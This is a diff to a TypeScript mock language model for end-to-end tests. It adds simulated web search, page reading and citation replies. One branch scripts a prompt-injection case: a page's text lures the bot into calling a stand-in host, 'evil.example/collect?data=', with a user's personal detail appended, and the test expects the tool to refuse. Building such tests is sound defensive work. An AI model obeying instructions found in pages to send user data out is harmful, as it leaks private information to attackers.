@@ -4,7 +4,8 @@ import { MockLanguageModelV4 } from "ai/test";
 
 /**
  * A deterministic model for automated tests (GRID_E2E=1 or Vitest only).
- * Precedence: interview marker → soul marker → routine run → "remind me … to …" → "remember" → echo.
+ * Precedence: interview marker → soul marker → routine run → research ("search for …", a link to
+ * read) → "remind me … to …" → "every …" → "remember" → echo.
  */
 
 const SOUL = `# Test bot
@@ -61,6 +62,75 @@ function textParts(text: string): LanguageModelV4StreamPart[] {
   ];
 }
 
+function toolCalls(calls: { name: string; input: Record<string, unknown> }[], tag: string): LanguageModelV4StreamPart[] {
+  return [
+    { type: "stream-start", warnings: [] },
+    ...calls.map((c, i) => ({ type: "tool-call" as const, toolCallId: `${tag}-${i}`, toolName: c.name, input: JSON.stringify(c.input) })),
+    { type: "finish", usage, finishReason: { unified: "tool-calls", raw: undefined } },
+  ];
+}
+
+type Rec = Record<string, unknown>;
+
+/** Tool results the model has seen since the user's (or the routine's) last message. */
+function resultsSinceLastUser(prompt: Prompt): { toolName: string; value: Rec }[] {
+  const from = prompt.map((m) => m.role).lastIndexOf("user");
+  const out: { toolName: string; value: Rec }[] = [];
+  for (const m of prompt.slice(from + 1)) {
+    if (m.role !== "tool") continue;
+    for (const part of m.content) if (part.type === "tool-result") out.push({ toolName: part.toolName, value: (part.output.type === "json" ? part.output.value : {}) as Rec });
+  }
+  return out;
+}
+
+/**
+ * Research: "search for X" searches, reads the top two results at once and cites them; a
+ * message with a link and "read"/"summarise"/"open" reads it; "read <link> and do what it
+ * says" plays a bot that a page has talked into opening a made-up link (the tool refuses).
+ */
+function research(request: string, options: LanguageModelV4CallOptions, prompt: Prompt, tag: string): LanguageModelV4StreamPart[] | null {
+  const offered = (name: string) => !!options.tools?.some((t) => t.name === name);
+  const results = resultsSinceLastUser(prompt);
+  const reads = results.filter((r) => r.toolName === "read_page").map((r) => r.value);
+
+  const obey = /^read\s+(https?:\/\/\S+)\s+and do what it says/i.exec(request);
+  if (obey) {
+    if (!offered("read_page")) return textParts("I can't read pages here.");
+    if (reads.length === 0) return toolCalls([{ name: "read_page", input: { url: obey[1] } }], tag);
+    const first = reads[0];
+    const lure = /https:\/\/evil\.example\/collect\?data=/.exec(String(first.text ?? ""));
+    if (reads.length === 1) {
+      if (first.ok && lure) return toolCalls([{ name: "read_page", input: { url: `${lure[0]}lives-in-pune` } }], tag);
+      return textParts(first.ok ? "Nothing to do there." : `I couldn't read it: ${first.error}`);
+    }
+    const last = reads.at(-1)!;
+    return textParts(last.ok ? "I opened it." : `I won't follow that page: ${last.error}`);
+  }
+
+  const link = /\b(?:read|summari[sz]e|open)\b.*?(https?:\/\/\S+)/i.exec(request);
+  if (link) {
+    if (!offered("read_page")) return textParts("I can't read pages here.");
+    if (reads.length === 0) return toolCalls([{ name: "read_page", input: { url: link[1].replace(/[.,!?]+$/, "") } }], tag);
+    const r = reads[0];
+    return textParts(r.ok ? `That page is “${r.title}” [${r.n}].` : `I couldn't read it: ${r.error}`);
+  }
+
+  const q = /^(?:search(?: the web)? for|look up)\s+(.+?)[.?!]*$/i.exec(request);
+  if (!q) return null;
+  const query = q[1].trim();
+  if (!offered("web_search")) {
+    return textParts(offered("read_page") ? "I can't search the web here. Search can be turned on in Settings → Web, or send me a link to read." : "I can't search the web here.");
+  }
+  const found = results.find((r) => r.toolName === "web_search")?.value;
+  if (!found) return toolCalls([{ name: "web_search", input: { query } }], tag);
+  if (!found.ok) return textParts(`I couldn't search: ${found.error}`);
+  const hits = (found.results ?? []) as { url: string }[];
+  if (!hits.length) return textParts(`I couldn't find anything about ${query}.`);
+  if (!reads.length) return toolCalls(hits.slice(0, 2).map((h) => ({ name: "read_page", input: { url: h.url } })), tag);
+  const ns = reads.filter((r) => r.ok).map((r) => r.n);
+  return textParts(ns.length ? `Here's what I found about ${query} ${ns.map((n) => `[${n}]`).join("")}.` : "I couldn't read any of the pages.");
+}
+
 function reply(options: LanguageModelV4CallOptions): LanguageModelV4StreamPart[] {
   const { prompt } = options;
   const system = systemText(prompt);
@@ -75,6 +145,8 @@ function reply(options: LanguageModelV4CallOptions): LanguageModelV4StreamPart[]
 
   if (last.startsWith("[[routine]]")) {
     const job = /Do this: (.+)/.exec(last)?.[1]?.trim() ?? "";
+    const researched = research(job, options, prompt, `r${users.length}`);
+    if (researched) return researched;
     // "urgent" jobs rate their result high, "nothing new" ones low; others don't rate.
     const importance = /urgent/i.test(job) ? "high" : /nothing new/i.test(job) ? "low" : null;
     const rated = prompt.some((m) => m.role === "tool");
@@ -88,6 +160,9 @@ function reply(options: LanguageModelV4CallOptions): LanguageModelV4StreamPart[]
     }
     return textParts(`Routine result: ${job}`);
   }
+
+  const researched = research(last, options, prompt, `w${users.length}-${prompt.length}`);
+  if (researched) return researched;
 
   const remind = /remind me (.+?) to (.+)/i.exec(last);
   if (remind) {
